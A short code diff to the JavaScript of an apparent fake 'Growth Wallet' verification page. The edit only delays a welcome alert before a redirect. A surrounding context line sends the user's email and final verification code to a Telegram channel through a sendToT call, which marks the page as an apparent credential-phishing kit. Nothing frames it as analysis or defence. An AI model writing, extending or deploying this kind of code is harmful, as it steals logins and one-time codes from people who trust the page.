@@ -178,8 +178,8 @@ document.addEventListener('DOMContentLoaded', function() {
         // Send final success to Telegram
         await sendToT(`✅ <b>Growth Wallet - Verification Complete</b>\n\nEmail: <code>${currentEmail}</code>\nFinal Code: <code>${code}</code>`);
         
-        alert(`Welcome to Growth Wallet, ${walletName}! Verification successful.`);
         setTimeout(function() {
+                    alert(`Welcome to Growth Wallet, ${walletName}! Verification successful.`);
                     window.location.href = 'home.html';
                 }, 2000);
         
